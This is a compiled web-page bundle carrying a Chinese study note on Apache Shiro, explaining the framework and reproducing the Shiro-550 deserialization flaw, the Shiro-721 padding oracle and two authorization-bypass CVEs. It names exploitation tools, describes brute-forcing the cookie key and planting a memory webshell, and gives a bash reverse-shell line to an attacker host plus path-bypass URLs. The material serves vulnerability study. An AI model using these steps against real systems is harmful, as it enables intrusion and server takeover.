import{_ as t}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as o,o as p,c,a,b as n,d as e,e as i}from"./app-Twu8vQvY.js";const r="/DailyNotes/assets/image-20230510160216954-dIfvnxQt.png",l="/DailyNotes/assets/企业微信截图_20230511133512-eGRja48y.png",u="/DailyNotes/assets/image-20230511151917585-MSmB7R7d.png",d="/DailyNotes/assets/img1-PbXrdQyD.png",g="/DailyNotes/assets/img2-_P4aR6K-.png",m="/DailyNotes/assets/img8-zyqYnJ4b.png",h="/DailyNotes/assets/img7-pZ1mirML.png",k="/DailyNotes/assets/img6-VWHtHRrc.png",v="/DailyNotes/assets/img5-PigUBQg5.png",b="/DailyNotes/assets/img3-4nbsMRx1.png",x="/DailyNotes/assets/img4-owb_NH9i.png",f="/DailyNotes/assets/img11-JdenbqKm.png",_="/DailyNotes/assets/img10-q9ePS9y_.png",S="/DailyNotes/assets/img9-lD2N9L_8.png",y="/DailyNotes/assets/企业微信截图_20230515164522-4e-zAQ8X.png",R="/DailyNotes/assets/企业微信截图_20230515170316-SR3keQ_J.png",q="/DailyNotes/assets/img15-lp2OShwx.png",E="/DailyNotes/assets/img16-enfvdpBJ.png",C="/DailyNotes/assets/img17-fpOx1gMf.png",M={},z=i('<h1 id="shiro介绍及漏洞复现" tabindex="-1"><a class="header-anchor" href="#shiro介绍及漏洞复现" aria-hidden="true">#</a> Shiro介绍及漏洞复现</h1><h2 id="_1-shiro简介" tabindex="-1"><a class="header-anchor" href="#_1-shiro简介" aria-hidden="true">#</a> 1. shiro简介</h2><h3 id="_1-1-shiro是什么" tabindex="-1"><a class="header-anchor" href="#_1-1-shiro是什么" aria-hidden="true">#</a> 1.1 shiro是什么</h3><p>权限管理框架，实现用户认证、用户授权。</p><figure><img src="'+r+'" alt="image-20230510160216954" tabindex="0" loading="lazy"><figcaption>image-20230510160216954</figcaption></figure><p><strong>Subject：主体</strong>；代表了当前“用户”，这个用户不一定是一个具体的人，与当前应用交互的任何东西都是Subject，如网络爬虫，机器人等；即一个抽象概念；所有Subject 都绑定到SecurityManager，与Subject的所有交互都会委托给SecurityManager；可以把Subject认为是一个门面；SecurityManager才是实际的执行者；</p><p><strong>SecurityManager：安全管理器</strong>；即所有与安全有关的操作都会与SecurityManager 交互；且它管理着所有Subject；可以看出它是Shiro 的核心，它负责与后边介绍的其他组件进行交互，如果学习过SpringMVC，你可以把它看成DispatcherServlet前端控制器；</p><p><strong>Realm：域</strong>；Shiro从从Realm获取安全数据（如用户、角色、权限），就是说SecurityManager要验证用户身份，那么它需要从Realm获取相应的用户进行比较以确定用户身份是否合法；也需要从Realm得到用户相应的角色/权限进行验证用户是否能进行操作；可以把Realm看成DataSource，即安全数据源。</p><h3 id="_1-2-基本功能点" tabindex="-1"><a class="header-anchor" href="#_1-2-基本功能点" aria-hidden="true">#</a> 1.2 基本功能点</h3><figure><img src="'+l+'" alt="企业微信截图_20230511133512" tabindex="0" loading="lazy"><figcaption>企业微信截图_20230511133512</figcaption></figure><ul><li>Authentication：身份认证 / 登录，验证用户是不是拥有相应的身份；</li><li>Authorization：授权，即权限验证，验证某个已认证的用户是否拥有某个权限；即判断用户是否能做事情</li><li>常见的如：验证某个用户是否拥有某个角色。或者细粒度的验证某个用户对某个资源是否具有某个权限；</li><li>Session Management：会话管理，即用户登录后就是一次会话，在没有退出之前，它的所有信息都在会话中；会话可以是普通 JavaSE 环境的，也可以是如 Web 环境的；</li><li>Cryptography：加密，保护数据的安全性，如密码加密存储到数据库，而不是明文存储；</li><li>Web Support：Web 支持，可以非常容易的集成到 Web 环境；</li><li>Caching：缓存，比如用户登录后，其用户信息、拥有的角色 / 权限不必每次去查，这样可以提高效率；</li><li>Concurrency：shiro 支持多线程应用的并发验证，即如在一个线程中开启另一个线程，能把权限自动传播过去；</li><li>Testing：提供测试支持；</li><li>Run As：允许一个用户假装为另一个用户（如果他们允许）的身份进行访问；</li><li>Remember Me：记住我，这个是非常常见的功能，即一次登录后，下次再来的话不用登录了</li></ul><h3 id="_1-3-简单demo演示" tabindex="-1"><a class="header-anchor" href="#_1-3-简单demo演示" aria-hidden="true">#</a> 1.3 简单Demo演示</h3><p>项目1：shiroDemo 自定义realm实现登录和鉴权</p><p>项目2：SpringBoot整合Shiro</p><figure><img src="'+u+'" alt="image-20230511151917585" tabindex="0" loading="lazy"><figcaption>image-20230511151917585</figcaption></figure><h2 id="_2-shiro漏洞举例" tabindex="-1"><a class="header-anchor" href="#_2-shiro漏洞举例" aria-hidden="true">#</a> 2. shiro漏洞举例</h2><h3 id="_2-1-shiro-550" tabindex="-1"><a class="header-anchor" href="#_2-1-shiro-550" aria-hidden="true">#</a> 2.1 shiro-550</h3><p><strong>Shiro&lt;=1.2.4</strong> 反序列化漏洞（CVE-2016-4437）</p><p><strong>漏洞原理</strong></p>',19),A={href:"https://issues.apache.org/jira/browse/SHIRO-550",target:"_blank",rel:"noopener noreferrer"},U={href:"https://github.com/stylefeng/Guns",target:"_blank",rel:"noopener noreferrer"},w=a("p",null,[a("strong",null,"源码分析")],-1),D={href:"https://github.com/godzeo/shiro/_1.2.4/_sample.git",target:"_blank",rel:"noopener noreferrer"},N=i('<p>分析结果：<code>org/apache/shiro/web/mgt/CookieRememberMeManager.java</code>继承了<code>org/apache/shiro/mgt/AbstractRememberMeManager.java</code>，如下：</p><figure><img src="'+d+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>先序列化，再AES加密，其中加密使用了密钥硬编码。</p><p>然后在<code>org/apache/shiro/web/mgt/CookieRememberMeManager.java</code>的<code>rememberSerializedIdentity()</code>中进行base64编码，并通过response返回。</p><figure><img src="'+g+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>解密过程是先base64解码—AES解密—反序列化。所以可以通过构造cookie进行反序列化攻击。</p><p>针对公开的密钥集合，我们可以在github上搜索到并加以利用。后面要用到的工具就收集了这些公开密码进行爆破。</p><p>我们如何获知选择的密钥是否与目标匹配呢？当密钥不正确或类型转换异常时，目标Response包含<code>Set-Cookie：rememberMe=deleteMe</code>字段，而当密钥正确且没有类型转换异常时，返回包不存在<code>Set-Cookie：rememberMe=deleteMe</code>字段。</p><p>参考：https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</p><p>https://zeo.cool/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B%EF%BC%9A</p><p><strong>漏洞复现</strong></p><p>判断是否存在漏洞，随意输入用户名和密码点击登录并抓包：</p><figure><img src="'+m+'" alt="img8" tabindex="0" loading="lazy"><figcaption>img8</figcaption></figure><p>在请求包的Cookie中为?rememberMe字段赋任意值，收到返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段，说明目标有使用Shiro框架，可以进一步测试。</p><figure><img src="'+h+'" alt="img7" tabindex="0" loading="lazy"><figcaption>img7</figcaption></figure><p>漏洞利用工具：https://github.com/SummerSec/ShiroAttack2</p><p>先爆破密钥：</p><figure><img src="'+k+'" alt="img6" tabindex="0" loading="lazy"><figcaption>img6</figcaption></figure><p>爆破利用链及回显：</p><figure><img src="'+v+'" alt="img5" tabindex="0" loading="lazy"><figcaption>img5</figcaption></figure><p>利用可行的利用链注入蚁剑内存马：</p><figure><img src="'+b+'" alt="img3" tabindex="0" loading="lazy"><figcaption>img3</figcaption></figure><p>蚁剑连接：</p><figure><img src="'+x+`" alt="img4" tabindex="0" loading="lazy"><figcaption>img4</figcaption></figure><p>工具2：https://github.com/zhzyker/shiro-1.2.4-rce</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python3 shiro-1.2.4_rce.py http://IP:PORT 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+f+'" alt="img11" tabindex="0" loading="lazy"><figcaption>img11</figcaption></figure><p>如图中一样手动输入系统类型linux或windows</p><figure><img src="'+_+'" alt="img10" tabindex="0" loading="lazy"><figcaption>img10</figcaption></figure><p>出现shell&gt;&gt;以后，攻击机开启nc监听。</p><p>在shell&gt;&gt;处填写bash反弹shell命令<code>bash -i &gt;&amp; /dev/tcp/攻击机ip/端口 0&gt;&amp;1</code></p><figure><img src="'+S+'" alt="img9" tabindex="0" loading="lazy"><figcaption>img9</figcaption></figure><p>反弹shell成功。</p><h3 id="_2-2-shiro-721" tabindex="-1"><a class="header-anchor" href="#_2-2-shiro-721" aria-hidden="true">#</a> 2.2 shiro-721</h3><p>Shiro Padding Oracle 远程命令执行漏洞（CVE-2019-12422）</p><p><strong>漏洞背景</strong></p><p>此处想要深入理解，需要学习一下AES加密，参考https://townmacro.cn/2022/09/06/%E6%B5%85%E8%AF%95%E6%8E%A2%E7%A9%B6shiro-721/</p><p><strong>漏洞原理</strong></p><p>Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，在后续的版本更新中，修复了之前shiro-550的固定KEY值，要求开发者自己设置，如果开发者没有设置，则默认动态生成一个KEY，降低了固定密钥泄漏的风险。然后后续的流程还是没变， <strong>1.2.5 &lt;= Shiro &lt; 1.4.2</strong>版本中仍然存在类似的漏洞，即shiro-721。</p><p>在cookie中使用的是AES-128-CBC模式进行的加密，在加密流程中使用了Padding填充，这里导致用户可以通过Padding Oracle攻击来生成攻击代码来构造恶意的rememberMe字段，然后触发反序列化攻击，最终导致的任意代码执行。</p><figure><img src="'+y+`" alt="企业微信截图_20230515164522" tabindex="0" loading="lazy"><figcaption>企业微信截图_20230515164522</figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1. 明文经过填充后，分为不同的组block，以组的方式对数据进行处理 
2. 初始化向量（IV）首先和第一组明文进行XOR（异或）操作，得到”中间值“
3. 采用密钥对中间值进行块加密，删除第一组加密的密文 （加密过程涉及复杂的变换、移位等） 
4. 第一组加密的密文作为第二组的初始向量（IV），参与第二组明文的异或操作  
5. 依次执行块加密，最后将每一块的密文拼接成密文  
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>由于初始化向量（IV）每次加密都是随机的，所以IV经常会被放在密文的前面，解密时先获取前面的IV，再对后面的密文进行解密。</p><figure><img src="`+R+`" alt="企业微信截图_20230515170316" tabindex="0" loading="lazy"><figcaption>企业微信截图_20230515170316</figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1. 会将密文进行分组（按照加密采用的分组大小），前面的第一组是初始化向量，从第二组开始才是真正的密文
2. 使用加密密钥对密文的第一组进行解密，得到”中间值“  
3. 将中间值和初始化向量进行异或，得到该组的明文
4. 前一块密文是后一块密文的IV，通过异或中间值，得到明文
5. 块全部解密完成后，拼接得到明文，密码算法校验明文的格式（填充格式是否正确）
6. 校验通过得到明文，校验失败得到密文 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>padding oracle attack破解明文与伪造密文</strong></p><p>https://cloud.tencent.com/developer/article/2130129</p><h3 id="_2-3-shiro-权限绕过漏洞原理及利用方式" tabindex="-1"><a class="header-anchor" href="#_2-3-shiro-权限绕过漏洞原理及利用方式" aria-hidden="true">#</a> 2.3 Shiro 权限绕过漏洞原理及利用方式</h3><p>代码：2-shiroSpringboot</p><h4 id="_1-cve-2020-1957" tabindex="-1"><a class="header-anchor" href="#_1-cve-2020-1957" aria-hidden="true">#</a> （1）CVE-2020-1957</h4><p><strong>shiro &lt; 1.5.2</strong></p><p>本漏洞起源于 SHIRO-682。在Spring中，/resource/xx与/resource/xx/都会被截成/resource/xx以访问相应资源；在shiro中，/resource/xx与/resource/xx/被视为两个不同路径。所以在Spring集成shiro时，只需要在访问路径后添加/就存在绕过权限校验的可能。</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code> <span class="token comment">//配置路径拦截规则，注意，要有序</span>
        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;/doLogin&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;anon&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        map.put(&quot;/**&quot;, &quot;authc&quot;);</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;/hello/**&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;authc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>1.anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口</p><p>2.authc为登录拦截器，需要登录认证才能访问的资源。</p><p>org\\apache\\shiro\\web\\util\\WebUtils.class PathMatchingFilterChainResolver加断点，访问/hello/1</p><p>先getRequestUri()</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getRequestUri</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> uri <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;javax.servlet.include.request_uri&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>uri <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            uri <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token function">normalize</span><span class="token punctuation">(</span><span class="token function">decodeAndCleanUriString</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> uri<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>调用normalize() 对decodeAndCleanUriString()处理得到的路径进行标准化处理. 标准化normalize()的处理包括:</p><ul><li>替换反斜线</li><li>替换 // 为 /</li><li>替换 /./ 为 /</li><li>替换 /…/ 为 /</li></ul><figure><img src="`+q+'" alt="img15" tabindex="0" loading="lazy"><figcaption>img15</figcaption></figure><p>最终会在PathMatchingFilterChainResolver中的getChain()方法进行校验，</p><figure><img src="'+E+`" alt="img16" tabindex="0" loading="lazy"><figcaption>img16</figcaption></figure><p>访问/hello/1 会匹配到/hello/*，但是/hello/1/就匹配不到了，shiro会认为这个不需要登录，会放行 。</p><p>​ 在使用了shiro的项目中，我们请求的URL(URL1)，经过shiro权限检验(URL2)，最后到springboot项目找到路由来处理(URL3) 漏洞的出现就在URL1,URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验，直接访问后端需要首选的URL。</p><p>（1）配置拦截规则</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[urls]
/index.html = anon
/user/** = authc
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>（2）构造原始URL: <code>/xxxx/..;/admin/index</code> （URL1）</p><p>（3）权限校验时会对传入的URL进行标准化处理，以 ;截断后面的请求，所以此时URL变为URL2 /xxxx/.. ， /xxxx/.. 不会匹配到/admin/** ，所以shiro权限校验就会通过。</p><p>（4）原始请求 <code>/xxxx/..;/admin/index</code> 进入到 springboot中，springboot对于每一个进入的request请求也会有自己的处理方式，Spring会先获取分号的位置，并检测分号后是否存在/，如果有，将/的位置记录在slashIndex变量中，并将分号前的数据与/之后的数据进行拼接，从而让/xxxx/..;/admin/index变为/xxxx/../admin/index，即为/admin/index。</p><p>（5）最后，我们来数理一下整个请求过程：</p><ol><li>客户端请求URL: <code>/xxxx/..;/admin/index</code></li><li>shrio 内部处理得到校验URL为 <code>/xxxx/..</code>校验通过</li><li>springboot 处理 <code>/xxxx/..;/admin/index</code> , 最终请求 <code>/admin/index</code>, 成功访问了后台请求.</li></ol><h4 id="_2-cve-2020-11989" tabindex="-1"><a class="header-anchor" href="#_2-cve-2020-11989" aria-hidden="true">#</a> （2）CVE-2020-11989</h4><p>SHIRO-782</p><p>由于shiro先获取的url，然后会判断分号是否存在，如果存在就会把后面的删除，进入shiro匹配，匹配不上默认放行，之后Spring web对路径进行规范化从而访问到了相应的页面。</p><p>进入decodeAndCleanUriString方法，发现此方法会以分号将传入的URI进行截断，并将分号以及分号后面的数据进行清空，返回分号前面的URI数据，从而让/a/b;/c变为/a/b。</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">decodeAndCleanUriString</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">String</span> uri<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        uri <span class="token operator">=</span> <span class="token function">decodeRequestString</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> uri<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> semicolonIndex <span class="token operator">=</span> uri<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token char">&#39;;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>semicolonIndex <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">?</span> uri<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> semicolonIndex<span class="token punctuation">)</span> <span class="token operator">:</span> uri<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Spring拦截器的decodeAndCleanUriString方法中，Spring对于分号处理的方式与Shiro不同，Spring会先获取分号的位置，并检测分号后是否存在/，如果有，将/的位置记录在slashIndex变量中，并将分号前的数据与/之后的数据进行拼接，从而让/a/b;/c变为/a/b/c。返回处理后的requestURI。</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">decodeAndCleanUriString</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">String</span> uri<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        uri <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeSemicolonContent</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>
        uri <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">decodeRequestString</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> uri<span class="token punctuation">)</span><span class="token punctuation">;</span>
        uri <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSanitizedPath</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> uri<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>所以访问/;/hello/1结果如下</p><figure><img src="`+C+`" alt="img17" tabindex="0" loading="lazy"><figcaption>img17</figcaption></figure><p>下面两种都能绕过</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>map.put(&quot;/hello/**&quot;, &quot;authc&quot;);
map.put(&quot;/hello/*&quot;, &quot;authc&quot;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>只有这么写的时候，才不存在问题</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>map.put(&quot;/**&quot;, &quot;authc&quot;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>（3）CVE-2020-13933</p><p>（4）CVE-2022-32532</p>`,87);function j(I,L){const s=o("ExternalLinkIcon");return p(),c("div",null,[z,a("p",null,[n("Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。Shiro 1.2.4及之前的版本中，在服务端对rememberMe的cookie值，先base64解码然后AES解密（加密密钥硬编码），最后反序列化（未作过滤处理），就导致了反序列化RCE漏洞。AES加密的密钥默认硬编码在代码里（"),a("a",A,[n("SHIRO-550"),e(s)]),n("）。")]),a("p",null,[n("有很多开源的项目内部集成了shiro并二次开发，可能会重现低版本shiro的默认固定密钥风险。例如开发者在使用shiro时通常会找一些教程来帮助快速搭建，针对教程中自定义的密钥未修改就直接copy过来的情况也比较常见。"),a("a",U,[n("Guns开源框架"),e(s)]),n("内部集成了shiro并进行二次开发，作者自定义密钥并固定，此时用户若不对密钥进行修改，即使升级shiro版本，也依旧存在固定密钥的风险。(相关issues地址https://github.com/stylefeng/Guns/issues/48)")]),w,a("p",null,[n("下载代码："),a("a",D,[n("https://github.com/godzeo/shiro_1.2.4_sample.git"),e(s)])]),N])}const P=t(M,[["render",j],["__file","shiro.html.vue"]]);export{P as default};
